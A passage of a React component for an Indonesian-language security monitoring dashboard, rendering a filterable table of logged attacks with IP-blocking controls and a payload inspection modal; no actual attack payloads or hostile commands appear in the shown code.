              onChange={(e) => setSelectedSeverityFilter(e.target.value)}
              className="bg-slate-900 border border-slate-700 text-slate-200 text-xs rounded-lg px-2.5 py-1.5 focus:outline-none focus:border-emerald-500 font-mono"
            >
              <option value="ALL">Semua Severity</option>
              <option value="CRITICAL">Critical Only</option>
              <option value="HIGH">High Severity</option>
              <option value="MEDIUM">Medium Severity</option>
            </select>

            {/* Search Input */}
            <div className="relative">
              <Search size={14} className="absolute left-3 top-2.5 text-slate-400" />
              <input
                type="text"
                placeholder="Cari IP, Kota, Endpoint..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-8 pr-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-200 placeholder-slate-500 text-xs focus:outline-none focus:border-emerald-500 w-44 sm:w-56"
              />
            </div>
          </div>
        </div>

        {/* Table Content */}
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs border-collapse">
            <thead>
              <tr className="border-b border-slate-800 bg-slate-900/50 text-slate-400 font-mono text-[11px] uppercase tracking-wider">
                <th className="py-3 px-4">Waktu &amp; ID</th>
                <th className="py-3 px-4">Tipe Serangan &amp; Hazard</th>
                <th className="py-3 px-4">IP &amp; Daerah Asal</th>
                <th className="py-3 px-4">Endpoint &amp; Payload Terdeteksi</th>
                <th className="py-3 px-4">Status Aksi</th>
                <th className="py-3 px-4 text-right">Tindakan</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 font-mono">
              {filteredThreats.length === 0 ? (
                <tr>
                  <td colSpan={6} className="py-12 text-center text-slate-500">
                    <ShieldCheck size={32} className="mx-auto mb-2 text-emerald-500/60" />
                    Tidak ada log serangan yang cocok dengan kriteria filter saat ini.
                  </td>
                </tr>
              ) : (
                filteredThreats.map((threat) => {
                  const isCrit = threat.severity.toUpperCase() === 'CRITICAL';
                  const isHigh = threat.severity.toUpperCase() === 'HIGH';

                  return (
                    <tr
                      key={threat.id}
                      className="hover:bg-slate-900/70 transition-colors group"
                    >
                      {/* 1. Time & ID */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <div className="font-bold text-slate-200">{threat.id}</div>
                        <div className="text-[10px] text-slate-500 flex items-center gap-1 mt-0.5">
                          <Clock size={10} />
                          <span>{threat.timestamp}</span>
                        </div>
                      </td>

                      {/* 2. Type & Hazard Badge */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <div className="flex items-center gap-2">
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider border ${
                              isCrit
                                ? 'bg-rose-950/90 text-rose-300 border-rose-500/80 shadow-[0_0_12px_rgba(244,63,94,0.35)] animate-pulse'
                                : isHigh
                                ? 'bg-amber-950/90 text-amber-300 border-amber-500/70'
                                : 'bg-sky-950/90 text-sky-300 border-sky-500/70'
                            }`}
                          >
                            {threat.severity}
                          </span>
                          <span className="font-semibold text-slate-200 text-xs">
                            {threat.attackType}
                          </span>
                        </div>
                      </td>

                      {/* 3. IP, Location & ASN */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <div className="flex items-center gap-1.5 font-bold text-slate-100">
                          <span>{threat.ip}</span>
                          <button
                            onClick={() => handleCopyIp(threat.ip)}
                            className="text-slate-500 hover:text-white transition-colors"
                            title="Salin IP"
                          >
                            {copiedIp === threat.ip ? (
                              <Check size={12} className="text-emerald-400" />
                            ) : (
                              <Copy size={12} />
                            )}
                          </button>
                        </div>
                        <div className="text-[10px] text-slate-400 flex items-center gap-1 mt-0.5">
                          <Globe size={11} className="text-cyan-400" />
                          <span>{threat.location}</span>
                        </div>
                        <div className="text-[9px] text-slate-500">{threat.asn}</div>
                      </td>

                      {/* 4. Target & Payload */}
                      <td className="py-3.5 px-4 max-w-xs md:max-w-md">
                        <div className="text-slate-300 font-bold truncate">
                          {threat.target}
                        </div>
                        <div
                          onClick={() => setSelectedThreatModal(threat)}
                          className="text-[11px] text-rose-300/90 bg-rose-950/30 border border-rose-900/40 rounded px-2 py-1 mt-1 truncate cursor-pointer hover:border-rose-500/60 transition-all font-mono"
                          title="Klik untuk melihat detail payload lengkap"
                        >
                          {threat.payload}
                        </div>
                      </td>

                      {/* 5. Action Status */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <span
                          className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[10px] font-bold border ${
                            threat.isBlocked
                              ? 'bg-rose-950/80 text-rose-300 border-rose-600/70'
                              : 'bg-emerald-950/80 text-emerald-300 border-emerald-600/70'
                          }`}
                        >
                          {threat.isBlocked ? (
                            <ShieldBan size={11} className="text-rose-400" />
                          ) : (
                            <ShieldCheck size={11} className="text-emerald-400" />
                          )}
                          <span>{threat.status}</span>
                        </span>
                      </td>

                      {/* 6. Quick Action Button */}
                      <td className="py-3.5 px-4 whitespace-nowrap text-right">
                        <div className="flex items-center justify-end gap-1.5">
                          <button
                            onClick={() => setSelectedThreatModal(threat)}
                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors"
                            title="Inspeksi Payload"
                          >
                            <Eye size={13} />
                          </button>

                          <button
                            onClick={() => handleToggleBlockIp(threat.id, threat.isBlocked, threat.ip)}
                            className={`px-2.5 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1 ${
                              threat.isBlocked
                                ? 'bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700'
                                : 'bg-rose-600 hover:bg-rose-500 text-white shadow-[0_0_10px_rgba(225,29,72,0.3)]'
                            }`}
                          >
                            {threat.isBlocked ? (
                              <>
                                <Unlock size={12} />
                                <span>Buka Blokir</span>
                              </>
                            ) : (
                              <>
                                <Lock size={12} />
                                <span>Blokir Permanen IP</span>
                              </>
                            )}
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Payload Inspection Modal */}
      {selectedThreatModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-2xl w-full p-6 shadow-2xl space-y-4 font-mono text-slate-200">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <ShieldAlert size={20} className="text-rose-500" />
                <h3 className="font-heading font-bold text-base text-white">
                  Inspeksi Forensik Payload Ancaman ({selectedThreatModal.id})
                </h3>
              </div>
              <button
                onClick={() => setSelectedThreatModal(null)}
                className="text-slate-400 hover:text-white p-1 rounded-lg"
              >
                ✕
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="grid grid-cols-2 gap-3 bg-slate-950 p-3 rounded-xl border border-slate-800">
                <div>
                  <span className="text-slate-500 block text-[10px]">IP PENYERANG:</span>
                  <span className="text-slate-100 font-bold">{selectedThreatModal.ip}</span>
                </div>
                <div>
                  <span className="text-slate-500 block text-[10px]">LOKASI &amp; ASN:</span>
                  <span className="text-slate-100">{selectedThreatModal.location} ({selectedThreatModal.asn})</span>
                </div>
                <div>
                  <span className="text-slate-500 block text-[10px]">TIPE ANCAMAN:</span>
                  <span className="text-rose-400 font-bold">{selectedThreatModal.attackType} ({selectedThreatModal.severity})</span>
                </div>
                <div>
                  <span className="text-slate-500 block text-[10px]">TARGET URI:</span>
                  <span className="text-cyan-300 font-bold">{selectedThreatModal.target}</span>
                </div>
              </div>

              <div>
                <span className="text-slate-400 text-xs font-bold block mb-1">
                  DEEP PACKET INSPECTION RAW PAYLOAD:
                </span>
                <div className="p-3.5 rounded-xl bg-slate-950 border border-rose-900/60 text-rose-300 font-mono text-xs overflow-x-auto whitespace-pre-wrap select-all">
                  {selectedThreatModal.payload}
                </div>
              </div>

              <div className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/30 text-emerald-300 text-xs">
                <span className="font-bold block mb-0.5">Status Penanganan Gateway:</span>
                Payload berhasil diisolasi oleh layer WAF Bionet tanpa menyentuh core database PostgreSQL atau session cache.
              </div>
            </div>

            <div className="flex items-center justify-between pt-3 border-t border-slate-800">
              <button
                onClick={() => handleCopyIp(selectedThreatModal.ip)}
                className="px-3 py-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white text-xs flex items-center gap-1.5"
              >
                <Copy size={13} />
                <span>Salin IP</span>
              </button>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => {
                    handleToggleBlockIp(
                      selectedThreatModal.id,
                      selectedThreatModal.isBlocked,
                      selectedThreatModal.ip
                    );
                    setSelectedThreatModal((prev) => ({
                      ...prev,
                      isBlocked: !prev.isBlocked,
                    }));
                  }}
                  className={`px-4 py-2 rounded-xl text-xs font-bold transition-all ${
                    selectedThreatModal.isBlocked
                      ? 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                      : 'bg-rose-600 text-white hover:bg-rose-500'
                  }`}
                >
                  {selectedThreatModal.isBlocked ? 'Buka Blokir IP Ini' : 'Blokir Permanen IP Ini'}
                </button>
                <button
                  onClick={() => setSelectedThreatModal(null)}
                  className="px-4 py-2 rounded-xl bg-slate-800 text-slate-300 hover:text-white text-xs"
                >
                  Tutup
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
